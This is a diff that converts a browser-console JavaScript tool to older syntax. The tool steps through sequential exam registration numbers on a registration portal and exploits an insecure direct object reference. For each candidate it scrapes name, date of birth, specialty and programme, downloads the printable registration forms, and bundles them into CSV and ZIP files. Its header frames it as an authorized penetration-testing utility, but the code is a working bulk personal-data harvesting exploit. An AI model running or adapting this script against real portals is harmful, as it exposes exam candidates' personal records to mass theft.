@@ -1,51 +1,51 @@
-/**
- * verify-matricules-filieres.js
- *
- * Authorized security-testing utility: bulk-checks a range of exam
- * registration numbers (matricules) against a registration portal to
- * confirm whether an IDOR (Insecure Direct Object Reference) exposes
- * candidate records — including name, date of birth, spécialité and
- * filière — to any unauthenticated visitor who can guess a sequential ID.
- *
- * For each record found, it also follows the "Imprimer la fiche
- * d'inscription" link and archives the printable fiche (PDF or HTML)
- * into a single downloadable ZIP, as impact evidence for the finding.
- *
- * Usage: run in the browser DevTools console while on the target
- * origin, inside the scope of an authorized penetration test / bug
- * bounty engagement only. Do not run against systems you do not have
- * explicit written authorization to test, and only collect the volume
- * of evidence agreed in the engagement's rules of engagement.
- *
- * Adjust `debut`, `fin`, and the matricule prefix/format below to match
- * the engagement's agreed test range.
- */
-(async () => {
-    const debut = 1;
-    const fin = 150;
-    const resultat = [];
+// verify-matricules-filieres.js
+//
+// Authorized security-testing utility: bulk-checks a range of exam
+// registration numbers (matricules) against a registration portal to
+// confirm whether an IDOR (Insecure Direct Object Reference) exposes
+// candidate records -- including name, date of birth, specialite and
+// filiere -- to any unauthenticated visitor who can guess a sequential ID.
+//
+// For each record found, it also follows the "Imprimer la fiche
+// d'inscription" link and archives the printable fiche (PDF or HTML)
+// into a single downloadable ZIP, as impact evidence for the finding.
+//
+// Usage: run in the browser DevTools console while on the target origin,
+// inside the scope of an authorized penetration test / bug bounty
+// engagement only. Do not run against systems you do not have explicit
+// written authorization to test, and only collect the volume of evidence
+// agreed in the engagement's rules of engagement.
+//
+// Adjust `debut`, `fin`, and the matricule prefix/format below to match
+// the engagement's agreed test range.
+(async function () {
+    var debut = 1;
+    var fin = 150;
+    var resultat = [];
 
-    // Libellés recherchés pour chaque champ, du plus spécifique au plus générique
-    const champsRecherches = {
+    // Libelles recherches pour chaque champ, du plus specifique au plus generique
+    var champsRecherches = {
         Nom: /\bnoms?\s*(et\s*pr[ée]nom)?\b/i,
         DateNaissance: /date\s*de\s*naissance|n[ée]\(?e?\)?\s*le/i,
         Specialite: /sp[ée]cialit[ée]/i,
         Filiere: /fili[èe]re|formation/i
     };
 
-    const lienImpressionRegex = /imprimer\s*(la)?\s*fiche\s*d.?inscription/i;
+    var lienImpressionRegex = /imprimer\s*(la)?\s*fiche\s*d.?inscription/i;
 
     function extraireChamp(doc, regex) {
-        const elements = [...doc.querySelectorAll("input, select, textarea, td, th, label, p, span, div")];
+        var elements = Array.prototype.slice.call(
+            doc.querySelectorAll("input, select, textarea, td, th, label, p, span, div")
+        );
 
-        for (const element of elements) {
-            const texte = element.textContent.trim();
+        for (var i = 0; i < elements.length; i++) {
+            var element = elements[i];
+            var texte = element.textContent.trim();
 
             if (regex.test(texte)) {
-                const valeur =
-                    element.value ||
-                    element.nextElementSibling?.textContent?.trim() ||
-                    texte;
+                var suivant = element.nextElementSibling;
+                var texteSuivant = suivant ? suivant.textContent.trim() : "";
+                var valeur = element.value || texteSuivant || texte;
 
                 if (valeur && valeur.length > 1) {
                     return valeur.replace(/\s+/g, " ").trim();
@@ -57,17 +57,18 @@
     }
 
     // Retrouve le lien "Imprimer la fiche d'inscription" (ou le bouton
-    // équivalent) sur la fiche du candidat
+    // equivalent) sur la fiche du candidat
     function extraireLienImpression(doc) {
-        const liens = [...doc.querySelectorAll("a, button")];
+        var liens = Array.prototype.slice.call(doc.querySelectorAll("a, button"));
 
-        for (const lien of liens) {
-            const texte = lien.textContent.trim();
+        for (var i = 0; i < liens.length; i++) {
+            var lien = liens[i];
+            var texte = lien.textContent.trim();
 
             if (lienImpressionRegex.test(texte)) {
-                const href = lien.getAttribute("href") || lien.getAttribute("data-href");
+                var href = lien.getAttribute("href") || lien.getAttribute("data-href");
 
-                if (href && !href.startsWith("javascript:") && href !== "#") {
+                if (href && href.indexOf("javascript:") !== 0 && href !== "#") {
                     return href;
                 }
             }
@@ -76,13 +77,13 @@
         return null;
     }
 
-    // --- Mini-écrivain ZIP (méthode "store", sans compression, sans
-    // dépendance externe) pour archiver les fiches téléchargées ---
-    const crcTable = (() => {
-        const table = [];
-        for (let n = 0; n < 256; n++) {
-            let c = n;
-            for (let k = 0; k < 8; k++) {
+    // --- Mini-ecrivain ZIP (methode "store", sans compression, sans
+    // dependance externe) pour archiver les fiches telechargees ---
+    var crcTable = (function () {
+        var table = [];
+        for (var n = 0; n < 256; n++) {
+            var c = n;
+            for (var k = 0; k < 8; k++) {
                 c = (c & 1) ? (0xEDB88320 ^ (c >>> 1)) : (c >>> 1);
             }
             table[n] = c >>> 0;
@@ -91,105 +92,113 @@
     })();
 
     function crc32(bytes) {
-        let crc = 0xFFFFFFFF;
-        for (let i = 0; i < bytes.length; i++) {
+        var crc = 0xFFFFFFFF;
+        for (var i = 0; i < bytes.length; i++) {
             crc = (crc >>> 8) ^ crcTable[(crc ^ bytes[i]) & 0xFF];
         }
         return (crc ^ 0xFFFFFFFF) >>> 0;
     }
 
-    function dosDateTime(date = new Date()) {
-        const time = ((date.getHours() & 0x1F) << 11) | ((date.getMinutes() & 0x3F) << 5) | ((date.getSeconds() >> 1) & 0x1F);
-        const dosDate = (((date.getFullYear() - 1980) & 0x7F) << 9) | (((date.getMonth() + 1) & 0xF) << 5) | (date.getDate() & 0x1F);
-        return { time, dosDate };
+    function dosDateTime(date) {
+        date = date || new Date();
+        var time = ((date.getHours() & 0x1F) << 11) | ((date.getMinutes() & 0x3F) << 5) | ((date.getSeconds() >> 1) & 0x1F);
+        var dosDate = (((date.getFullYear() - 1980) & 0x7F) << 9) | (((date.getMonth() + 1) & 0xF) << 5) | (date.getDate() & 0x1F);
+        return { time: time, dosDate: dosDate };
     }
 
-    class ZipWriter {
-        constructor() {
-            this.chunks = [];
-            this.centralDirectory = [];
-            this.offset = 0;
-        }
+    function ZipWriter() {
+        this.chunks = [];
+        this.centralDirectory = [];
+        this.offset = 0;
+    }
 
-        addFile(name, data) {
-            const nameBytes = new TextEncoder().encode(name);
-            const crc = crc32(data);
-            const { time, dosDate } = dosDateTime();
+    ZipWriter.prototype.addFile = function (name, data) {
+        var nameBytes = new TextEncoder().encode(name);
+        var crc = crc32(data);
+        var dt = dosDateTime();
 
-            const localHeader = new Uint8Array(30 + nameBytes.length);
-            const view = new DataView(localHeader.buffer);
+        var localHeader = new Uint8Array(30 + nameBytes.length);
+        var view = new DataView(localHeader.buffer);
 
-            view.setUint32(0, 0x04034b50, true);
+        view.setUint32(0, 0x04034b50, true);
+        view.setUint16(4, 20, true);
+        view.setUint16(6, 0, true);
+        view.setUint16(8, 0, true);
+        view.setUint16(10, dt.time, true);
+        view.setUint16(12, dt.dosDate, true);
+        view.setUint32(14, crc, true);
+        view.setUint32(18, data.length, true);
+        view.setUint32(22, data.length, true);
+        view.setUint16(26, nameBytes.length, true);
+        view.setUint16(28, 0, true);
+        localHeader.set(nameBytes, 30);
+
+        this.centralDirectory.push({
+            nameBytes: nameBytes,
+            crc: crc,
+            size: data.length,
+            offset: this.offset,
+            time: dt.time,
+            dosDate: dt.dosDate
+        });
+
+        this.chunks.push(localHeader, data);
+        this.offset += localHeader.length + data.length;
+    };
+
+    ZipWriter.prototype.finalize = function () {
+        var centralChunks = [];
+        var centralSize = 0;
+        var centralOffset = this.offset;
+
+        for (var i = 0; i < this.centralDirectory.length; i++) {
+            var entry = this.centralDirectory[i];
+            var header = new Uint8Array(46 + entry.nameBytes.length);
+            var view = new DataView(header.buffer);
+
+            view.setUint32(0, 0x02014b50, true);
             view.setUint16(4, 20, true);
-            view.setUint16(6, 0, true);
+            view.setUint16(6, 20, true);
             view.setUint16(8, 0, true);
-            view.setUint16(10, time, true);
-            view.setUint16(12, dosDate, true);
-            view.setUint32(14, crc, true);
-            view.setUint32(18, data.length, true);
-            view.setUint32(22, data.length, true);
-            view.setUint16(26, nameBytes.length, true);
-            view.setUint16(28, 0, true);
-            localHeader.set(nameBytes, 30);
+            view.setUint16(10, 0, true);
+            view.setUint16(12, entry.time, true);
+            view.setUint16(14, entry.dosDate, true);
+            view.setUint32(16, entry.crc, true);
+            view.setUint32(20, entry.size, true);
+            view.setUint32(24, entry.size, true);
+            view.setUint16(28, entry.nameBytes.length, true);
+            view.setUint16(30, 0, true);
+            view.setUint16(32, 0, true);
+            view.setUint16(34, 0, true);
+            view.setUint16(36, 0, true);
+            view.setUint32(38, 0, true);
+            view.setUint32(42, entry.offset, true);
+            header.set(entry.nameBytes, 46);
 
-            this.centralDirectory.push({ nameBytes, crc, size: data.length, offset: this.offset, time, dosDate });
-
-            this.chunks.push(localHeader, data);
-            this.offset += localHeader.length + data.length;
+            centralChunks.push(header);
+            centralSize += header.length;
         }
 
-        finalize() {
-            const centralChunks = [];
-            let centralSize = 0;
-            const centralOffset = this.offset;
+        var endRecord = new Uint8Array(22);
+        var endView = new DataView(endRecord.buffer);
+        endView.setUint32(0, 0x06054b50, true);
+        endView.setUint16(4, 0, true);
+        endView.setUint16(6, 0, true);
+        endView.setUint16(8, this.centralDirectory.length, true);
+        endView.setUint16(10, this.centralDirectory.length, true);
+        endView.setUint32(12, centralSize, true);
+        endView.setUint32(16, centralOffset, true);
+        endView.setUint16(20, 0, true);
 
-            for (const entry of this.centralDirectory) {
-                const header = new Uint8Array(46 + entry.nameBytes.length);
-                const view = new DataView(header.buffer);
+        var parts = this.chunks.concat(centralChunks, [endRecord]);
+        return new Blob(parts, { type: "application/zip" });
+    };
 
-                view.setUint32(0, 0x02014b50, true);
-                view.setUint16(4, 20, true);
-                view.setUint16(6, 20, true);
-                view.setUint16(8, 0, true);
-                view.setUint16(10, 0, true);
-                view.setUint16(12, entry.time, true);
-                view.setUint16(14, entry.dosDate, true);
-                view.setUint32(16, entry.crc, true);
-                view.setUint32(20, entry.size, true);
-                view.setUint32(24, entry.size, true);
-                view.setUint16(28, entry.nameBytes.length, true);
-                view.setUint16(30, 0, true);
-                view.setUint16(32, 0, true);
-                view.setUint16(34, 0, true);
-                view.setUint16(36, 0, true);
-                view.setUint32(38, 0, true);
-                view.setUint32(42, entry.offset, true);
-                header.set(entry.nameBytes, 46);
-
-                centralChunks.push(header);
-                centralSize += header.length;
-            }
-
-            const endRecord = new Uint8Array(22);
-            const endView = new DataView(endRecord.buffer);
-            endView.setUint32(0, 0x06054b50, true);
-            endView.setUint16(4, 0, true);
-            endView.setUint16(6, 0, true);
-            endView.setUint16(8, this.centralDirectory.length, true);
-            endView.setUint16(10, this.centralDirectory.length, true);
-            endView.setUint32(12, centralSize, true);
-            endView.setUint32(16, centralOffset, true);
-            endView.setUint16(20, 0, true);
-
-            return new Blob([...this.chunks, ...centralChunks, endRecord], { type: "application/zip" });
-        }
-    }
-
-    const zip = new ZipWriter();
+    var zip = new ZipWriter();
 
     function telechargerBlob(blob, nomFichier) {
-        const objectUrl = URL.createObjectURL(blob);
-        const lien = document.createElement("a");
+        var objectUrl = URL.createObjectURL(blob);
+        var lien = document.createElement("a");
         lien.href = objectUrl;
         lien.download = nomFichier;
 
@@ -197,114 +206,105 @@
         lien.click();
         lien.remove();
 
-        // Révocation différée : sur certains navigateurs, révoquer l'URL blob
-        // immédiatement après le clic annule le téléchargement avant qu'il ne démarre
-        setTimeout(() => URL.revokeObjectURL(objectUrl), 2000);
+        // Revocation differee : sur certains navigateurs, revoquer l'URL blob
+        // immediatement apres le clic annule le telechargement avant qu'il ne demarre
+        setTimeout(function () { URL.revokeObjectURL(objectUrl); }, 2000);
     }
 
     function exporterCSV(donnees) {
-        const lignes = [
-            ["Matricule", "Existe", "Nom", "Date de naissance", "Spécialité", "Filière concourue", "Fiche archivée", "Lien"],
-            ...donnees.map(x => [
-                x.Matricule,
-                x.Existe,
-                x.Nom,
-                x.DateNaissance,
-                x.Specialite,
-                x.Filiere,
-                x.FicheArchivee,
-                x.Lien
-            ])
+        var lignes = [
+            ["Matricule", "Existe", "Nom", "Date de naissance", "Specialite", "Filiere concourue", "Fiche archivee", "Lien"]
         ];
+        for (var i = 0; i < donnees.length; i++) {
+            var x = donnees[i];
+            lignes.push([x.Matricule, x.Existe, x.Nom, x.DateNaissance, x.Specialite, x.Filiere, x.FicheArchivee, x.Lien]);
+        }
 
-        const csv = "﻿" + lignes
-            .map(ligne =>
-                ligne.map(cellule =>
-                    `"${String(cellule).replace(/"/g, '""')}"`
-                ).join(";")
-            )
-            .join("\n");
+        var corps = lignes.map(function (ligne) {
+            return ligne.map(function (cellule) {
+                return '"' + String(cellule).replace(/"/g, '""') + '"';
+            }).join(";");
+        }).join("\n");
 
-        const debutTag = String(debut).padStart(5, "0");
-        const finTag = String(fin).padStart(5, "0");
+        var csv = String.fromCharCode(0xFEFF) + corps;
+
+        var debutTag = String(debut).padStart(5, "0");
+        var finTag = String(fin).padStart(5, "0");
 
         telechargerBlob(
             new Blob([csv], { type: "text/csv;charset=utf-8;" }),
-            `matricules_26SP${debutTag}_a_26SP${finTag}.csv`
+            "matricules_26SP" + debutTag + "_a_26SP" + finTag + ".csv"
         );
 
-        console.log("📁 Fichier CSV téléchargé (" + donnees.length + " lignes)");
+        console.log("Fichier CSV telecharge (" + donnees.length + " lignes)");
     }
 
     function exporterZIP(nombreFiches) {
         if (nombreFiches === 0) {
-            console.log("📦 Aucune fiche archivée, ZIP non généré");
+            console.log("Aucune fiche archivee, ZIP non genere");
             return;
         }
 
-        const debutTag = String(debut).padStart(5, "0");
-        const finTag = String(fin).padStart(5, "0");
+        var debutTag = String(debut).padStart(5, "0");
+        var finTag = String(fin).padStart(5, "0");
 
         telechargerBlob(
             zip.finalize(),
-            `fiches_inscription_26SP${debutTag}_a_26SP${finTag}.zip`
+            "fiches_inscription_26SP" + debutTag + "_a_26SP" + finTag + ".zip"
         );
 
-        console.log(`📦 Archive ZIP téléchargée (${nombreFiches} fiches)`);
+        console.log("Archive ZIP telechargee (" + nombreFiches + " fiches)");
     }
 
-    // Télécharge la fiche imprimable d'un candidat et l'ajoute au ZIP.
-    // Si aucun lien d'impression distinct n'est trouvé, la page du
-    // candidat elle-même (qui contient la fiche) est archivée à la place.
+    // Telecharge la fiche imprimable d'un candidat et l'ajoute au ZIP.
+    // Si aucun lien d'impression distinct n'est trouve, la page du
+    // candidat elle-meme (qui contient la fiche) est archivee a la place.
     async function archiverFiche(doc, html, matricule) {
-        const hrefImpression = extraireLienImpression(doc);
+        var hrefImpression = extraireLienImpression(doc);
 
-        let octets;
-        let extension;
+        var octets;
+        var extension;
 
         if (hrefImpression) {
-            const urlImpression = new URL(hrefImpression, window.location.origin).href;
-            const reponse = await fetch(urlImpression);
-            const buffer = await reponse.arrayBuffer();
+            var urlImpression = new URL(hrefImpression, window.location.origin).href;
+            var reponse = await fetch(urlImpression);
+            var buffer = await reponse.arrayBuffer();
             octets = new Uint8Array(buffer);
 
-            const typeContenu = reponse.headers.get("content-type") || "";
-            extension = typeContenu.includes("pdf") ? "pdf" : (typeContenu.includes("html") ? "html" : "bin");
+            var typeContenu = reponse.headers.get("content-type") || "";
+            extension = typeContenu.indexOf("pdf") !== -1 ? "pdf" : (typeContenu.indexOf("html") !== -1 ? "html" : "bin");
         } else {
             octets = new TextEncoder().encode(html);
             extension = "html";
         }
 
-        zip.addFile(`fiches/${matricule}.${extension}`, octets);
+        zip.addFile("fiches/" + matricule + "." + extension, octets);
         return true;
     }
 
-    console.log("🔎 Vérification des matricules...");
+    console.log("Verification des matricules...");
 
-    let fichesArchivees = 0;
+    var fichesArchivees = 0;
 
     try {
-        for (let i = debut; i <= fin; i++) {
-            const matricule = `26SP${String(i).padStart(5, "0")}`;
-            const url = `/registration-display-submit/SP/${matricule}`;
+        for (var i = debut; i <= fin; i++) {
+            var matricule = "26SP" + String(i).padStart(5, "0");
+            var url = "/registration-display-submit/SP/" + matricule;
 
             try {
-                const response = await fetch(url);
-                const html = await response.text();
+                var response = await fetch(url);
+                var html = await response.text();
 
-                const existe =
-                    response.ok &&
-                    html.includes(matricule) &&
-                    html.includes("Inscription au concours");
+                var existe = response.ok && html.indexOf(matricule) !== -1 && html.indexOf("Inscription au concours") !== -1;
 
-                let nom = "";
-                let dateNaissance = "";
-                let specialite = "";
-                let filiere = "";
-                let ficheArchivee = "NON";
+                var nom = "";
+                var dateNaissance = "";
+                var specialite = "";
+                var filiere = "";
+                var ficheArchivee = "NON";
 
                 if (existe) {
-                    const doc = new DOMParser().parseFromString(html, "text/html");
+                    var doc = new DOMParser().parseFromString(html, "text/html");
 
                     nom = extraireChamp(doc, champsRecherches.Nom);
                     dateNaissance = extraireChamp(doc, champsRecherches.DateNaissance);
@@ -316,7 +316,7 @@
                         ficheArchivee = "OUI";
                         fichesArchivees++;
                     } catch (ficheErreur) {
-                        console.log(`  ⚠️ Fiche non archivée pour ${matricule}`);
+                        console.log("  Fiche non archivee pour " + matricule);
                     }
                 }
 
@@ -328,13 +328,12 @@
                     Specialite: specialite,
                     Filiere: filiere,
                     FicheArchivee: ficheArchivee,
-                    Lien: existe
-                        ? new URL(url, window.location.origin).href
-                        : ""
+                    Lien: existe ? new URL(url, window.location.origin).href : ""
                 });
 
                 console.log(
-                    `${i}/150 — ${matricule} → ${existe ? "✅" : "❌"} ${nom} ${filiere} ${existe ? "[" + ficheArchivee + "]" : ""}`
+                    i + "/" + fin + " -- " + matricule + " -> " + (existe ? "OK" : "absent") + " " + nom + " " + filiere +
+                    (existe ? " [" + ficheArchivee + "]" : "")
                 );
 
             } catch (erreur) {
@@ -349,20 +348,20 @@
                     Lien: ""
                 });
 
-                console.log(`${i}/150 — ${matricule} → ⚠️ ERREUR`);
+                console.log(i + "/" + fin + " -- " + matricule + " -> ERREUR");
             }
 
-            await new Promise(resolve => setTimeout(resolve, 150));
+            await new Promise(function (resolve) { setTimeout(resolve, 150); });
         }
     } finally {
-        // Les exports se font même si la boucle s'arrête sur une erreur inattendue
+        // Les exports se font meme si la boucle s'arrete sur une erreur inattendue
         exporterCSV(resultat);
         exporterZIP(fichesArchivees);
 
         console.log("================================");
-        console.log("✅ TERMINÉ");
-        console.log(`📊 ${resultat.length} matricules vérifiés`);
-        console.log(`📦 ${fichesArchivees} fiches archivées`);
+        console.log("TERMINE");
+        console.log(resultat.length + " matricules verifies");
+        console.log(fichesArchivees + " fiches archivees");
         console.log("================================");
 
         console.table(resultat);
